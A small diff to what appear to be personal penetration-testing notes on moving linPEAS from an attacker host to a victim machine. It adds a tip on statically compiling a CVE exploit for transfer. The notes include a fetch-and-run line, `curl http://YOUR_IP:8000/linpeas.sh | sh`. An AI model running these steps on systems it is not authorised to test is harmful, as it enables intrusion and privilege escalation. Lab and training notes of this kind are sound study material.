@@ -118,3 +118,5 @@ int main()
 1- on the attacker machine: `cd ~/tools/privesc/PEASS-ng/linPEAS` THEN `python3 -m http.server 8000`
 2- on the victim machine: `curl http://YOUR_IP:8000/linpeas.sh | sh` OR `wget http://YOUR_IP:8000/linpeas.sh -O /tmp/linpeas.sh` then chmod +x
 3- activate using `./linpeas.sh`
+
+tip: if you compile a cve exploit, `use gcc -static exploit.c -o exploit` then transfer exploit
